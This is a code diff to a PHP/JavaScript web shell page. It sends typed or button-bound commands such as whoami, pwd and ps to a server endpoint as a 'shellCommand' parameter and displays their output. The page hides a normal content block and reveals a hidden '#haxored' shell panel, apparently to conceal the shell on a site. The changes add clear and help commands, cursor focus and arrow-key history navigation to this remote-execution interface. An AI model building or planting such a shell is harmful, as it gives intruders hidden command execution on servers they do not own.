@@ -180,7 +180,7 @@
 <div id="Xcontainer">
 	<div id="XmenuNav">
 		<ul class="XmenuOptions">
-			<li><button id="home" value="ls"> Home </button></li>
+			<li><button id="home" value="clear"> Clear </button></li>
 			<li><button id="XbuttonPwd" name="command" value="pwd">PWD</button></li>
 			<li><button id="XbuttonPerm" name="command" value="whoami">Permissions</button></li>
 			<li><button id="XbuttonPs" name="command" value="ps">Processes</button></li>
@@ -213,6 +213,7 @@
 				$("body").css({"margin":"0"});
 				$("#luserContent").remove();
 				$("#haxored").prop("hidden", false);
+				$("#shellInput").focus();
 			} else {
 				$("#haxored").remove();
 			}
@@ -230,15 +231,63 @@
 			// This function requests command to be executed and then calls renderCmd.
 			function submit(command) {
 				history.push(command);
-				$.ajax({
-					url: "<?php echo $connectstr; ?>",
-					type: "GET",
-					data: {"shellCommand": command},
-					success: function(data) {
-						renderCmd(command, data)
-					}
-				});
+				if (command == "clear") {
+					$("#XShellOutput").empty();
+					$("#shellInput").focus();
+				} else if (command == "help") {
+					var help = "This is just a normal unix shell!\n\n"
+					renderCmd(command, help)
+				} else {
+					$.ajax({
+						url: "<?php echo $connectstr; ?>",
+						type: "GET",
+						data: {"shellCommand": command},
+						success: function(data) {
+							renderCmd(command, data)
+						}
+					});
+				}
 			}
+
+			jQuery.fn.putCursorAtEnd = function() {
+
+				return this.each(function() {
+    
+				// Cache references
+				var $el = $(this),
+				el = this;
+
+				// Only focusus if input isn't already
+				if (!$el.is(":focus")) {
+					$el.focus();
+				}
+
+				// If this function exists... (IE 9+)
+				if (el.setSelectionRange) {
+
+				// Double the length because Opera is inconsistent about whether a carriage return is one character or two.
+				var len = $el.val().length * 2;
+      
+				// Timeout seems to be required for Blink
+				setTimeout(function() {
+					el.setSelectionRange(len, len);
+				}, 1);
+    
+			 } else {
+      
+				// As a fallback, replace the contents with itself
+				// Doesn't work in Chrome, but Chrome supports setSelectionRange
+				$el.val($el.val());
+      
+				}
+
+				// Scroll to the bottom, in case we're in a tall textarea
+				// (Necessary for Firefox and Chrome)
+				this.scrollTop = 999999;
+
+			});
+
+		};
 
 			// This function takes the command output and displays it in the output div.
 			function renderCmd(command, output) {
@@ -246,6 +295,7 @@
 				$("#XShellOutput").append("<pre class='command'>" + time + " "+ user + "@" + hostname + " $ " + command + "</pre><br>");
 				$("#XShellOutput").append("<pre class='output'>" + output + "</pre>");
 				$("#XShellOutput").scrollTop($("#XShellOutput")[0].scrollHeight);
+				$("#shellInput").focus();
 			}
 			
 			// This function maps any item ID to a submit command based on value. Give anything a value="command" and make it clickable.
@@ -254,6 +304,7 @@
 					submit($(this).val());
 				});
 			}
+			
 
 			// This messy bit of code cycles through all the items on the menu bar and makes them clickable. using the above function.
 			$("ul").children('li').children('button').each(function() {
@@ -263,27 +314,22 @@
 			// This handles the arrow key cycling of history and commands.
 			var inputshell = document.getElementById("XinputShell");
 			inputshell.addEventListener("keydown", function(e) {
-				
 				// Clear ShellInput when Enter is pressed
 				if (e.which == 13) {
 					submit($("#shellInput").val());
+					counter = 0;
 					$("#shellInput").val("");
-				}
-				
+				} else if (e.which == 38 && counter < history.length) {
 				// Go back in history when UP is pressed
-				if (e.which == 38 && counter < history.length) {
 					counter += 1;
 					$("#shellInput").val(history[history.length - counter]);
-				}
-
+					$("#shellInput").putCursorAtEnd();
+				} else if (e.which == 40 && counter > 0) {
 				// Go Forward in history when DOWN is pressed
-				if (e.which == 40 && counter > 0) {
 					counter -= 1;
 					$("#shellInput").val(history[history.length - counter]);
-				}
-				
+				} else if (e.keyCode == 90 && e.ctrlKey) {
 				// Clear ShellOutput when CTRL+Z is pressed/
-				if (e.keyCode == 90 && e.ctrlKey) {
 					$("#XShellOutput").empty();
 				}
 			});
